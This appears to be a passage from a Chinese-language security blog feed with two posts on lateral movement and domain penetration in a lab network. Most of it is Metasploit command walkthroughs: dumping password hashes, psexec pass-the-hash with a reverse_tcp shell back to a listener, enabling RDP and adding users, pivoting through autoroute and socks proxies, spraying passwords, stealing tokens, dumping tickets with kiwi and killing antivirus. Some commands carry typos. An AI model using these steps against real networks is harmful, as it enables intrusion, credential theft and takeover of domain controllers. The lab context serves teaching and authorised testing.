id="34-psexec登录内网主机"><a class="markdownIt-Anchor" href="#34-psexec登录内网主机">#</a> 3.4 psexec 登录内网主机</h2><ul><li>连接 meterpreter 后门后进程迁移或提权到 system，使用 hashdump 导出 hash</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> migrate <span class="token number">334</span>meterpreter <span class="token operator">></span> hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>使用 smb_version 或在 meterpreter 中 run 搜索模块进行 445 端口扫描</li><li>使用 <code>exploit/windows/smb/psexec</code>  模块进行攻击</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">info exploit/windows/smb/psexec <span class="token comment">#查看模块信息</span>use exploit/windows/smb/psexec <span class="token comment">#使用模块</span>show options <span class="token comment">#查看选项</span>use exploit/windows/smb/psexec <span class="token comment">#设置payload</span><span class="token builtin class-name">set</span> SMBUser administrator <span class="token comment">#设置攻击用户</span><span class="token builtin class-name">set</span> rhosts <span class="token number">10.10</span>.10.135 <span class="token comment">#设置攻目标IP，可设置C段</span><span class="token builtin class-name">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 <span class="token comment">#设置hash</span><span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp <span class="token comment">#设置payload</span><span class="token builtin class-name">set</span> lhost <span class="token number">10.10</span>.10.139 <span class="token comment">#设置监听主机IP</span><span class="token builtin class-name">set</span> lport <span class="token number">6666</span> <span class="token comment">#设置监听端口</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="35-开启远程终端"><a class="markdownIt-Anchor" href="#35-开启远程终端">#</a> 3.5 开启远程终端</h2><ul><li>getgui 模块 —— 用于开启远程终端</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> run getgui -e <span class="token comment">#开启远程终端</span>meterpreter <span class="token operator">></span> run post/windows/manage/enable_rdpmeterpreter <span class="token operator">></span> run getgui -u m -p QWEasd123 <span class="token comment">#添加本地用户，再手动添加管理员</span>rdesktop <span class="token number">127.0</span>.0.1:1234 <span class="token comment">#连接目标IP远程终端</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="36-端口转发"><a class="markdownIt-Anchor" href="#36-端口转发">#</a> 3.6 端口转发</h2><ul><li>如果目标主机在开启防火墙的情况下，有可能拦截远程终端端口（3389），使用 msf 将 3389 端口转发出来</li><li>模块：portfwd</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token builtin class-name">help</span> portfwdrdesktop <span class="token number">10.10</span>.10.138 <span class="token comment">#开启防火墙后无法连接</span>meterpreter <span class="token operator">></span> <span class="token function">netstat</span> <span class="token comment">#查看目标端口，发现开启3389并且处于监听状态，但由于防火墙拦截无法连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>转发 3389</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> portfwd <span class="token function">add</span> -l <span class="token number">1234</span> -p <span class="token number">3389</span> -r 受害者主机IP <span class="token comment">#将3389端口转发到攻击机本地的1234端口上</span>meterpreter <span class="token operator">></span> portfwd list <span class="token comment">#查看转发的列表</span>rdesktop <span class="token number">127.0</span>.0.1:1234 <span class="token comment">#连接本地1234端口即连接受害者3389</span>meterpreter <span class="token operator">></span> portfwd flush <span class="token comment">#清空转发列表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="37-跨路由访问"><a class="markdownIt-Anchor" href="#37-跨路由访问">#</a> 3.7 跨路由访问</h2><ul><li>在渗透测试过程中，经常拿到 web 主机与数据库不同在一个网段，可以得出这台主机还连着一个内网， 如果想要继续渗透内网，可以把这台 web 主机当作跳板机，对内网进行渗透</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220917160524427.png" alt="image-20220917160524427"></p><ul><li><p>kali 无法直接访问目标主机，但是 kali 拿下受害者后发现受害者可以访问目标主机，所以可以通过受害者做跳板访问目标主机</p></li><li><p>使用 msf 生成后门并连接</p></li><li><p>连接后 kali 使用的是桥接模式，windoes server 5 有两块网卡，一块是桥接，另一块是 10.10.10 的仅主机模式的内网网卡，连接到 windows server5 后可 arp_scan 扫描 10 网段的主机，但是在 kali 中直接 ping 是无法访问的</p></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919175444253.png" alt="image-20220919175444253"></p><ul><li>获取受害者主机网卡</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> run get_local_subnets <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919175717693.png" alt="image-20220919175717693"></p><ul><li>绑定路由</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> run autoroute -s <span class="token number">10.10</span>.10.0/24 <span class="token comment">#将本机和10网段进行绑定</span>meterpreter <span class="token operator">></span> run autoroute -p <span class="token comment">#查看已绑定的路由表</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> route <span class="token function">add</span> <span class="token number">10.10</span>.10.0 <span class="token number">255.255</span>.255.0 <span class="token number">1</span> <span class="token comment">#最后的1是指session，要先将session放到后台</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> route print <span class="token comment">#查看已绑定的路由表，要先将session放到后台</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919175906054.png" alt="image-20220919175906054"></p><ul><li>使用 socks_proxy 开启隧道</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary/server/socks_proxy <span class="token comment">#直接使用默认端口和版本即可</span>msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">></span> exploit <span class="token comment">#默认以jobs的方式后台运行</span>msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">jobs</span> <span class="token comment">#查看运行的socks</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>编辑本地隧道代理文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">vi</span> /etc/proxychains4.conf<span class="token comment">#将最后一行改为 socks5 本地IP 端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919180632507.png" alt="image-20220919180632507"></p><ul><li>这时就可以通过 proxychains4 工具跨路由访问</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token number">10.10</span>.10.144 -sT -A -p <span class="token number">445</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919180955255.png" alt="image-20220919180955255"></p><ul><li>在 msf 中设置代理</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">setg Proxies socks4/5:ip:port <span class="token comment">#让msf所有模块的流量都通过此代理走。(setg全局设置)</span>msf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> setg Proxies socks5:10.189.0.249:1080msf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> ReverseAllowProxy <span class="token boolean">true</span> <span class="token comment">#允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>之后可在 msf 中使用模块并访问到目标主机</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919182151677.png" alt="image-20220919182151677"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp <span class="token comment">#reverse是反向连接，bind是正向连接</span>payload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/bind_tcpmsf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4smbpass <span class="token operator">=</span><span class="token operator">></span> aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4msf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919182833003.png" alt="image-20220919182833003"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919182854383.png" alt="image-20220919182854383"></p><h2 id="38-域信息收集"><a class="markdownIt-Anchor" href="#38-域信息收集">#</a> 3.8 域信息收集</h2><h3 id="381-常用信息收集模块"><a class="markdownIt-Anchor" href="#381-常用信息收集模块">#</a> 3.8.1 常用信息收集模块</h3><ul><li>收集端口信息</li></ul><pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep #基于arp协议发现内网存活主机，这不能通过代理使用auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp #基于tcp进行端口扫描，默认扫描1-10000端口auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep #基于udp协议发现内网存活主机auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe #基于udp协议发现内网存活主机auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname #基于netbios协议发现内网存活主机auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version #发现内网ftp服务，基于默认21端口auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version #发现内网ssh服务，基于默认22端口auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version #发现内网telnet服务，基于默认23端口auxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp #发现dns服务，基于默认53端口auxiliary&#x2F;scanner&#x2F;http&#x2F;http_version #发现内网http服务，基于默认80端口auxiliary&#x2F;scanner&#x2F;http&#x2F;title #探测内网http服务的标题auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version #发现内网smb服务，基于默认的445端口use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_hashdump #发现内网oracle服务,基于默认的1521端口auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version #发现内网mysql服务，基于默认3306端口auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner #发现内网RDP服务，基于默认3389端口auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_server #发现内网Redis服务，基于默认6379端口auxiliary&#x2F;scanner&#x2F;db2&#x2F;db2_version #探测内网的db2服务，基于默认的50000端口auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>收集域信息</li></ul><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #查看登录过的用户信息run post&#x2F;windows&#x2F;gather&#x2F;enum_ad_groups #查看组信息run post&#x2F;windows&#x2F;gather&#x2F;enum_domain #定位域控run post&#x2F;windows&#x2F;gather&#x2F;enum_ad_computers #域内所有机器use post&#x2F;windows&#x2F;gather&#x2F;enum_patches #发现缺失的补丁use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester #快速识别可能被利用的漏洞run post&#x2F;windows&#x2F;manage&#x2F;migrate #自动进程迁移run post&#x2F;windows&#x2F;gather&#x2F;checkvm #查看目标主机是否运行在虚拟机上run post&#x2F;windows&#x2F;manage&#x2F;killav #关闭杀毒软件run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面服务run post&#x2F;windows&#x2F;manage&#x2F;autoroute #查看路由信息run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #列举当前登录的用户run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #列举应用程序run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #抓取自动登录的用户名和密码run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump #dump出所有用户的hashrun post&#x2F;windows&#x2F;gather&#x2F;enum_domain_tokens #寻找域token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="382-tcp端口扫描"><a class="markdownIt-Anchor" href="#382-tcp端口扫描">#</a> 3.8.2 tcp 端口扫描</h3><ul><li>由于 3.7 已经设置了代理，可直接用跳板扫描 10.10.10 网段</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary/scanner/portscan/tcpmsf6 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhosts <span class="token number">10.10</span>.10.1/24msf6 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> ports <span class="token number">445</span>msf6 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919184419946.png" alt="image-20220919184419946"></p><h2 id="39-密码喷射"><a class="markdownIt-Anchor" href="#39-密码喷射">#</a> 3.9 密码喷射</h2><ul><li>探测存在的用户</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary/gather/kerberos_enumusersmsf6 auxiliary<span class="token punctuation">(</span>gather/kerberos_enumusers<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> domain redteam.clubdomain <span class="token operator">=</span><span class="token operator">></span> redteam.clubmsf6 auxiliary<span class="token punctuation">(</span>gather/kerberos_enumusers<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhosts <span class="token number">10.10</span>.10.136 <span class="token comment">#设置域控IP</span>rhosts <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.10.136msf6 auxiliary<span class="token punctuation">(</span>gather/kerberos_enumusers<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> user_file ~/Desktop/user <span class="token comment">#设置用户名字典</span>user_file <span class="token operator">=</span><span class="token operator">></span> ~/Desktop/user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919214858920.png" alt="image-20220919214858920"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919214926688.png" alt="image-20220919214926688"></p><ul><li>对多个 IP 指定用户猜解密码</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/smb/smb_login<span class="token builtin class-name">set</span> user_file <span class="token comment">#用户名文件</span><span class="token builtin class-name">set</span> sbmpass <span class="token comment">#明文密码</span><span class="token builtin class-name">set</span> rhosts <span class="token comment">#攻击IP，可以是一个网段</span><span class="token builtin class-name">set</span> smbdomain <span class="token comment">#域</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919215241974.png" alt="image-20220919215241974"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919215211554.png" alt="image-20220919215211554"></p><h2 id="310-令牌登录"><a class="markdownIt-Anchor" href="#310-令牌登录">#</a> 3.10 令牌登录</h2><ul><li><mark>需要本地管理员权限才能看到凭证和 ps 信息，才能进行窃取和注入进程</mark></li><li>如果开启了代理无法启动监听，执行：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> ReverseAllowProxy <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> load incognito <span class="token comment">#加载incognito模块</span>meterpreter <span class="token operator">></span> list_tokens -u <span class="token comment">#列出当前系统可用的token</span>meterpreter <span class="token operator">></span> impersonate_token <span class="token string">'NT AUTHORITY\SYSTEM'</span> <span class="token comment">#假冒SYSTEM token</span>meterpreter <span class="token operator">></span> impersonate_token NT AUTHORITY<span class="token punctuation">\</span>SYSTEM <span class="token comment">#参数不加单引号需要对特殊字符进行转义</span>meterpreter <span class="token operator">></span> rev2self <span class="token comment">#返回原始token</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919221416882.png" alt="image-20220919221416882"></p><h2 id="311-steal_token窃取令牌"><a class="markdownIt-Anchor" href="#311-steal_token窃取令牌">#</a> 3.11 steal_token 窃取令牌</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ps</span> <span class="token comment">#查看系统进程信息</span>meterpreter <span class="token operator">></span> steal_token <span class="token operator">&lt;</span>pid值<span class="token operator">></span> <span class="token comment">#从指定进程中窃取token</span>meterpreter <span class="token operator">></span> drop_token <span class="token comment">#删除窃取的token</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919221455764.png" alt="image-20220919221455764"></p><h2 id="312-msf使用kiwi导出票据"><a class="markdownIt-Anchor" href="#312-msf使用kiwi导出票据">#</a> 3.12 msf 使用 kiwi 导出票据</h2><ul><li>导出票据需要<mark> system 权限</mark></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> load kiwi <span class="token comment">#加载kiwi模块</span>meterpreter <span class="token operator">></span> creds_msv <span class="token comment">#列出可用的ntlm</span>meterpreter <span class="token operator">></span> dcsycn_ntlm redteam<span class="token punctuation">\</span><span class="token punctuation">\</span>administrator <span class="token comment">#通过NTLM进行切换身份</span>meterpreter <span class="token operator">></span> dcsycn readteam<span class="token punctuation">\</span><span class="token punctuation">\</span>administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="313-ms-14-086"><a class="markdownIt-Anchor" href="#313-ms-14-086">#</a> 3.13 MS 14-086</h2><ul><li>域控为 windows server <mark>2008</mark> 时使用</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220919222259959.png" alt="image-20220919222259959"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#参数说明</span>-domain：域名-password：普通域用户密码-rhosts：域控主机名.域名-rport：域控端口（默认）-user：普通域用户-user_sid：域普通用户SID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;#常用命令
sessions -K 结束全部会话&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-row</summary>
      
    
    
    
    <category term="web安全" scheme="http://example.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透小结</title>
    <link href="http://example.com/post/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%B0%8F%E7%BB%93.html"/>
    <id>http://example.com/post/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%B0%8F%E7%BB%93.html</id>
    <published>2022-10-06T13:57:10.000Z</published>
    <updated>2022-10-06T14:04:51.517Z</updated>
    
    <content type="html"><![CDATA[<h1 id="域渗透"><a class="markdownIt-Anchor" href="#域渗透">#</a> 域渗透</h1><ul><li>常用命令总结</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">klist #查看当前存储的票证net view &#x2F;domain:domainame #查询域内主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="1-域基本信息-域控收集"><a class="markdownIt-Anchor" href="#1-域基本信息-域控收集">#</a> 1、域基本信息、域控收集</h2><ul><li><p>使用 systeminfo 命令，当主机在域中时，会显示所在的域</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826101026482.png" alt="image-20220826101026482"></p></li><li><p>使用 net time /domain 查看域控</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net time <span class="token operator">/</span>domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826102449678.png" alt="image-20220826102449678"></p></li><li><p>使用 net view 查看有几个域，但是一般会出错</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net view<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826101201523.png" alt="image-20220826101201523"></p></li><li><p>确定域控主机的 IP</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nltest <span class="token operator">/</span>dclist:moonsec<span class="token comment">#查看域控</span>ping 域控主机名 <span class="token comment">#查看域控地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826102155464.png" alt="image-20220826102155464"></p></li><li><p>其他信息收集命令</p></li></ul><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all #查询当前环境，可根据DNS后缀搜索列表查看域控net user &#x2F;domain #查询当前域用户net time #查询域控net group &#x2F;domain #查询域工作组net group &quot;domain admins&quot; &#x2F;domain #查询域管理用户，可以根据上一步查询的组结果查询组内成员net group &quot;domain controllers&quot; &#x2F;domain #查询域控主机名称，可以根据结果ping获取域控IPnet config workstation #查看当前工作环境nltest &#x2F;dclist:moonsec #查询域控ping 12server-dc.moonsec.fbi #用ping命令查询域控IPnslookup 12server-dc.moonsec.fbi #使用nslookup查询域控主机IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-主机发现"><a class="markdownIt-Anchor" href="#2-主机发现">#</a> 2、主机发现</h2><p>在域内进行横向渗透时，首先要收集主机的端口和 IP 信息。</p><ul><li><p>net view /domain:moonsec 查询域内的主机信息</p><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain:moonsec #一般会出错，如果错误6118，要在域控内将Computer Browser服务启动<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>arp -a 查询通信</p><pre class="line-numbers language-none"><code class="language-none">arp -a #显示当前主机的arp交换表（IP与MAC地址绑定表）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 nbtscan 发现主机，项目地址：<a href="https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4">https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4</a></p><pre class="line-numbers language-none"><code class="language-none">nbtscan.exe -r 192.168.0.1&#x2F;24 #可以扫描整个C段的存活主机（不止局限于域内）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826103933833.png" alt="image-20220826103933833"></p></li><li><p>bat 命令发现主机 —— 系统自带命令，不用软件</p><pre class="line-numbers language-none"><code class="language-none">for &#x2F;l %i in (1,1,255) do @ping 10.189.0.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&#x3D;&quot; #修改所在IP段，也是不局限于域内的主机<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826104422522.png" alt="image-20220826104422522"></p></li><li><p>基于 MSF 的内网主机探测</p><ul><li>使用 msf 进行反弹 shell，获取内网主机后，通过 msf 自带的扫描模块进行 IP 扫描</li></ul><pre class="line-numbers language-none"><code class="language-none">主机存活探测：auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep #ARP扫描auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep #UDP扫描auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname #NETBIOS扫描auxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_enum #SNMP扫描auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version #SMB扫描端口扫描：auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack TCP #ACK端口扫描auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ftpbounce #FTP bounce端口扫描auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn #SYN 端口扫描auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp #TCP端口扫描，使用较多auxiliary&#x2F;scanner&#x2F;portscan&#x2F;xmas #TCP XMas端口扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>nmap 扫描</p><pre class="line-numbers language-none"><code class="language-none">-sT: TCP 扫描-sS: SYN 扫描-sA: ACK 扫描-sF：FIN 扫描-sU: UDP 扫描-sR: RPC 扫描-sP: ICMP 扫描nmap -sS -p 1-65535 -v 192.168.99.177 #扫描示例，使用SYN扫描指定IP的所有端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="3-常见端口及服务"><a class="markdownIt-Anchor" href="#3-常见端口及服务">#</a> 3、常见端口及服务</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826105036692.png" alt="image-20220826105036692"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826105100663.png" alt="image-20220826105100663"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826105114788.png" alt="image-20220826105114788"></p><h2 id="4-域渗透思路"><a class="markdownIt-Anchor" href="#4-域渗透思路">#</a> 4、域渗透思路</h2><p>​通过域成员主机，定位出域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网。</p><h2 id="5-内网渗透token"><a class="markdownIt-Anchor" href="#5-内网渗透token">#</a> 5、内网渗透 Token</h2><p><strong>令牌</strong> (token) 是系统的<strong>临时秘钥</strong>，相当于<strong>账号和密码</strong>，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌在系统重新启动前将持续存在于系统中。 令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p><p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需 要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p><p><strong>令牌的分类</strong>：</p><ul><li>访问令牌 (Access Token)：表示访问控制操作主体的系统对象</li><li>会话令牌 (Session Token)：是交互会话中唯一的身份标识符</li><li>密保令牌 (Security 